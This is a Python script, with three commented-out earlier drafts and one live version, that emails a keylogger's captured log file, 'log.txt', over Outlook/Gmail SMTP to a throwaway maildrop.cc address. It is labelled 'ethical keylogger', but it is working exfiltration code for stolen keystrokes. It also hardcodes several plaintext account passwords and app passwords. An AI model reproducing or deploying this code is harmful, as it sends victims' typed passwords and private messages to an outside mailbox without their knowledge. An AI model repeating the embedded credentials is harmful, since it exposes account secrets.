# import smtplib
# from email.mime.text import MIMEText
# from email.mime.multipart import MIMEMultipart
# from email.mime.base import MIMEBase
# from email import encoders
#
# email_user = 'ethicalhackingtest01@outlook.com'  # Replace with your email address
# email_send = 'your_temporary_email@maildrop.cc'
# email_password = 'AqxyG01!'  # Replace with your email password
# subject = 'Ethical Keylogger'
#
# msg = MIMEMultipart()
# msg['ethicalhackingtest01@outlook.com'] = email_user
# msg['your_temporary_email@maildrop.cc'] = email_send
# msg['Subject'] = subject
#
# body = 'Here is the keylogger.'
# msg.attach(MIMEText(body, 'plain'))
#
# # Update the file location
# filename = 'log.txt'  # Ensure this is the correct path to your log file
# try:
#     with open(filename, 'rb') as attachment:
#         part = MIMEBase('application', 'octet-stream')
#         part.set_payload(attachment.read())
#     encoders.encode_base64(part)
#     part.add_header('Content-Disposition', f"attachment; filename={filename}")
#     msg.attach(part)
# except FileNotFoundError:
#     print(f"Error: The file '{filename}' was not found. Ensure the file exists in the specified location.")
#     exit()
#
# text = msg.as_string()
# server = smtplib.SMTP('smtp.gmail.com', 587)
# server.starttls()
#
# try:
#     server.login(email_user, email_password)
#     server.sendmail(email_user, email_send, text)
#     print("Email sent successfully!")
# except smtplib.SMTPAuthenticationError:
#     print("Error: Failed to log in. Check your email and password.")
# finally:
# server.quit()

# import smtplib
# from email.mime.text import MIMEText
# from email.mime.multipart import MIMEMultipart
# from email.mime.base import MIMEBase
# from email import encoders
#
# # Email credentials
# email_user = 'ethicalhackingtest01@outlook.com'  # Replace with your Outlook email address
# email_send = 'your_temporary_email@maildrop.cc'  # Receiver's email address
# email_password = 'jajnrnsmawkopjba'  # Replace with your app password
# subject = 'ethical keylogger'
#
# # Prepare the email
# msg = MIMEMultipart()
# msg['From'] = email_user
# msg['To'] = email_send
# msg['Subject'] = subject
#
# body = 'Here is the keylogger log file attached.'
# msg.attach(MIMEText(body, 'plain'))
#
# # Attach the file
# filename = 'log.txt'  # Ensure this is the correct path to your log file
# with open(filename, 'rb') as attachment:
#     part = MIMEBase('application', 'octet-stream')
#     part.set_payload(attachment.read())
# encoders.encode_base64(part)
# part.add_header('Content-Disposition', f"attachment; filename={filename}")
# msg.attach(part)
#
#
#
# # Connect to the SMTP server using SSL (port 465)
# server = smtplib.SMTP_SSL('smtp-mail.outlook.com', 587)  # SSL server
# server.login(email_user, email_password)  # Log in to your Outlook account
# server.sendmail(email_user, email_send, msg.as_string())  # Send the email
#
# print("Email sent successfully!")
#
# # Close the connection to the server
# server.quit()



# import smtplib
# from email.mime.text import MIMEText
# from email.mime.multipart import MIMEMultipart
# from email.mime.base import MIMEBase
# from email import encoders
#
# # Email credentials
# email_user = 'ethicalhackingtest01@outlook.com'
# email_send = 'your_temporary_email@maildrop.cc'
# email_password = 'jajnrnsmawkopjba'
# subject = 'ethical keylogger'
#
# # Prepare the email
# msg = MIMEMultipart()
# msg['From'] = email_user
# msg['To'] = email_send
# msg['Subject'] = subject
#
# body = 'Here is the keylogger log file attached.'
# msg.attach(MIMEText(body, 'plain'))
#
# # Attach the file
# filename = 'log.txt'
# with open(filename, 'rb') as attachment:
#     part = MIMEBase('application', 'octet-stream')
#     part.set_payload(attachment.read())
# encoders.encode_base64(part)
# part.add_header('Content-Disposition', f"attachment; filename={filename}")
# msg.attach(part)
#
# # Connect to the SMTP server
# server = smtplib.SMTP('smtp-mail.outlook.com', 587)
# server.set_debuglevel(1)  # Enable debug output
# server.starttls()
#
# try:
#     server.login(email_user, email_password)  # Log in
#     server.sendmail(email_user, email_send, msg.as_string())  # Send the email
#     print("Email sent successfully!")
# except smtplib.SMTPAuthenticationError as e:
#     print(f"Authentication Error: {e}")
# except Exception as e:
#     print(f"An error occurred: {e}")
# finally:
#     server.quit()  # Close the connection

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Email credentials
email_user = 'ethicalhackingtest01@outlook.com'
email_send = 'your_temporary_email@maildrop.cc'
email_password = 'chgggucbkwqfmggj'  # Replace with your valid app password
subject = 'ethical keylogger'

# Prepare the email
msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Here is the keylogger log file attached.'
msg.attach(MIMEText(body, 'plain'))

# Attach the file
filename = 'log.txt'
with open(filename, 'rb') as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', f"attachment; filename={filename}")
msg.attach(part)

# Use STARTTLS for port 587
try:
    server = smtplib.SMTP('smtp-mail.outlook.com', 587)  # Correct server and port for STARTTLS
    server.set_debuglevel(1)  # Enable debugging
    server.starttls()  # Upgrade connection to secure TLS
    server.login(email_user, email_password)  # Log in to your account
    server.sendmail(email_user, email_send, msg.as_string())  # Send the email
    print("Email sent successfully!")
except smtplib.SMTPAuthenticationError as e:
    print(f"Authentication Error: {e}")
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    server.quit()  # Close the connection

